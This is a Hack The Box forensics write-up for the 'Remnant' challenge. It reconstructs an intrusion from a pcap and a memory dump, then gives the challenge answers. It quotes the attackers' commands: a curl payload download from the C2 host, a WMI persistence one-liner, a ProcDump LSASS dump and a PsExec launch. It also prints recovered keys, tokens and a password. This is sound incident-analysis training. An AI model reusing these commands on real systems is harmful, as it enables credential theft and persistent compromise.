# Remnant: HTB Forensics Writeup

## Scenario
Two artifacts:
- `capture.pcap` (34 MB): network capture, incident window `2026-01-31 08:42-08:45 UTC`
- `so.dmp` (34 MB): minidump of `C:\Windows\Temp\so.exe` (the C2 beacon) running on `JUMP01` as `NT AUTHORITY\SYSTEM`

## Answers (TL;DR)

| # | Question | Answer |
|---|----------|--------|
| 1 | Password of compromised account used to pivot into `JUMP01` | `CoffeeMonring@` |
| 2 | Name of WMI object created for persistence | `SystemOptimize` |
| 3 | MD5 of shellcode injected into a process | `f77d42ed3d0bd6888cb85d742ba8ef19` |
| 4 | Unix timestamp sensitive data from `JUMP01` uploaded to attacker storage | `1769849198` |
| 5 | Filename of document stolen from CFO's computer in attacker storage | `VCS-Internal-Report.pdf` |

---

## Network map (pcap)
- `172.168.200.58` = **JUMP01** (RDP server :3389, cert CN=JUMP01, also runs `so.exe` beacon)
- `172.168.200.57` = RDP client (workstation `JUMP03`): attacker pivot in
- `96.237.253.177` = C2 (`update.microsoft-windows.com`), ports **8443** (beacon TLS) and **8888** (payload staging)

Flows:
- `08:42:46` RDP `.57 → .58:3389` (TLS, cipher `0x003d` TLS_RSA_WITH_AES_256_CBC_SHA256, NLA/CredSSP)
- `08:44:05` beacon TLS `.58 → .177:8443` (TLS 1.3)
- `08:44:41` HTTP GET `.58 → .177:8888/CloudSyncer.7z`

---

## Step 1: Decrypt the C2 channel (port 8443, TLS 1.3)
The beacon `so.exe` is the process dumped in `so.dmp`. TLS 1.3 traffic-secret keys still live in memory.

1. Scanned `so.dmp` for AES-256 key schedules (validated forward key-expansion). Found two keys.
2. Brute-forced 12-byte GCM IVs in the neighborhood of each key schedule; verified by GCM-authenticating the first record of each direction:
   - client→server key `e207019e…5923e498`, IV `e470d2fc259348ce0793de70`
   - server→client key `c13c1f5d…141a1b5a`, IV `0448c4e1e737413cfc7aff22`
3. Decrypted the whole session (all records MAC-verified). It is HTTP `POST /MicrosoftUpdate/ShellEx/KB242742/*.aspx` with a base64 body.

### Application-layer cipher
Body = base64 → repeating-key XOR. Index-of-coincidence gave key length 29; recovered key:

```
dfsdgferhzdzxczevre5595485sdg
```

Decrypted beacon JSON (`{"ARC":"x64","BH":"utUa5ERcnzZ3aMTinTqHMQwIxcezXaw4","HN":"JUMP01",...,"UN":"NT AUTHORITY\\SYSTEM"}`) and full tasking transcript.

### C2 tasking recovered
| INS | detail |
|-----|--------|
| LM `ListDirectory.dll` / `Shell.dll` / `Powershell.dll` / `Inject.dll` | reflectively loaded modules |
| **inject** `-r /clt/klg.bin 7628` | shellcode (keylogger) injected into PID 7628 |
| shell | `curl update.microsoft-windows.com:8888/CloudSyncer.7z -o C:\Windows\Temp\CloudSyncer.7z` |
| powershell | `7z.exe x CloudSyncer.7z -powersyncer -oC:\Windows\Temp -y` (7z password = `owersyncer`... actual archive pw below) |
| powershell | `CloudSyncer.exe upload C:\Windows\Temp\error.dmp --compress` |

**Q3: injected shellcode MD5:** the `inject` task payload (`DA` field, base64) is the raw shellcode written to PID 7628 → **`f77d42ed3d0bd6888cb85d742ba8ef19`**.

---

## Step 2: CloudSyncer exfil tool
`CloudSyncer.7z` was carved from the port-8888 HTTP response in the pcap and extracted with password `owersyncer` → `CloudSyncer.exe` (.NET single-file). Unpacked the bundle → `CloudSyncer.dll`.

Embedded strings reveal it exfiltrates to **Google Drive** (resumable upload API) and hard-codes OAuth refresh tokens:

```
client_id     549473216521-co8mu32h9n7...apps.googleusercontent.com   [redacted]
client_secret GOCSPX-bg99DR...[redacted]
refresh_token 1//04JtX2myC6Q6vCgYIARAAGAQSNwF-...
archive pw    6\1p0`BeVm]7/S.
```

Minting an access token and listing the attacker's Drive:

| name | createdTime (UTC) |
|------|------|
| `VCS-EXEC-CFO-MRB-002_VCS-Internal-Report.pdf.zip` | 2026-02-03 17:21 |
| **`JUMP01_error.dmp.zip`** | **2026-01-31 08:46:38.613Z** |
| `PsExec64.exe`, `*_database.zip`, `*_Telegram/Viber*.zip`, `VDI-BO-002_VDI-creds.kdbx`, … | 2026-01-20 |

**Q4: upload timestamp of JUMP01 sensitive data:** `JUMP01_error.dmp.zip` createdTime `2026-01-31T08:46:38Z` → **`1769849198`**.

**Q5: CFO document:** `VCS-EXEC-CFO-MRB-002_...` (CFO = exec role tag `EXEC-CFO`). The zip (AES, pw `6\1p0`BeVm]7/S.`) contains **`VCS-Internal-Report.pdf`**.

---

## Step 3: `error.dmp` is an LSASS dump of JUMP01
Downloaded and extracted `JUMP01_error.dmp.zip` → `error.dmp` = minidump of `lsass.exe` (pid 812, Win11 build 26100). Created by ProcDump (`prcd.exe -ma lsass.exe error`, seen in the RDP session, below).

---

## Step 4: Decrypt the RDP session (Q1 + Q2)
RDP used `TLS_RSA_WITH_AES_256_CBC_SHA256` (RSA key exchange) so the session is decryptable with the server's private key, but the RSA private key in LSASS is CNG-protected. Instead, **SChannel caches the TLS master secret**:

1. RDP client/server randoms are present in `error.dmp` (adjacent, an SChannel session struct).
2. Brute-forced 48-byte master-secret candidates near each random copy; verified by deriving key material (`PRF-SHA256`) and CBC/HMAC-checking the first server record. Hit:
   - master secret `3944135d…d0da4b3c`
3. Decrypted both directions (every record MAC-verified). The traffic is **CredSSP/NLA (NTLMSSP)**.

### Q2: WMI persistence (from RDP clipboard, cleartext CLIPRDR channel)
The attacker pasted a PowerShell one-liner, recovered verbatim:

```powershell
$F=([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance();$F.Name='SystemOptimize';...
$C=([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance();$C.Name='SystemOptimize';
$C.CommandLineTemplate='C:\Windows\Temp\so.exe update.microsoft-windows.com 8443 https';...
$B=([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding")...
```
Also observed: `prcd.exe -accepteula -ma lsass.exe error` (the LSASS dump) and `pse.exe -s -accepteula -i -d C:\Windows\Temp\so.exe ...`.

**WMI object name → `SystemOptimize`** (the `__EventFilter` / `CommandLineEventConsumer` `.Name`).

### Q1: pivot password (CredSSP TSPasswordCreds)
NLA identity from NTLMSSP type3: `JUMP01\Administrator` from workstation `JUMP03`. The cleartext password is inside CredSSP `authInfo`, sealed with the NTLM session key → need Administrator's NT hash.

1. pypykatz mis-parsed MSV on build 26100 (template offset drift), but it **did** recover the LSA keys
   (`AES 243f19689a54204986346a929a509fff`, `IV d821c4f6…`).
2. Manually walked the MSV logon-session list (patched `minidump` reader to read across segment boundaries), located Administrator's session, and decrypted the `Primary` credential blob with pypykatz's LSA decryptor:
   - **NT hash `7f166d02eb42dc07bacc8e83f02738dc`**: verified against the RDP NetNTLMv2.
3. Derived NTLM keys and unsealed CredSSP `authInfo`:
   - `SessionBaseKey = HMAC_MD5(HMAC_MD5(NThash, "ADMINISTRATOR"+"JUMP01"), NTProofStr)`
   - `ExportedSessionKey = RC4(SessionBaseKey, EncryptedRandomSessionKey)`
   - `ClientSealingKey = MD5(ExportedSessionKey + "session key to client-to-server sealing key magic constant\0")`
   - RC4-decrypt pubKeyAuth (advance stream) then authInfo → `TSPasswordCreds`:

```
Domain  : JUMP01
Username: Administrator
Password: CoffeeMonring@
```

Confirmed: `MD4("CoffeeMonring@".utf16le) == 7f166d02eb42dc07bacc8e83f02738dc`.

**Q1 → `CoffeeMonring@`**

---

## Attack chain summary
1. Initial access harvest (2026-01-20): CloudSyncer steals browser creds / KeePass / DB dumps / CFO docs → Google Drive.
2. Pivot (2026-01-31 08:42): RDP into `JUMP01` as `JUMP01\Administrator` (`CoffeeMonring@`).
3. Deploy `so.exe` beacon (SYSTEM), C2 over TLS:8443 with XOR-layer (`dfsdgferhzdzxczevre5595485sdg`).
4. Persistence: WMI `__FilterToConsumerBinding` named `SystemOptimize`.
5. Inject keylogger shellcode (MD5 `f77d42ed…`) into PID 7628.
6. Dump LSASS with ProcDump → `error.dmp`, exfil as `JUMP01_error.dmp.zip` (upload `1769849198`).
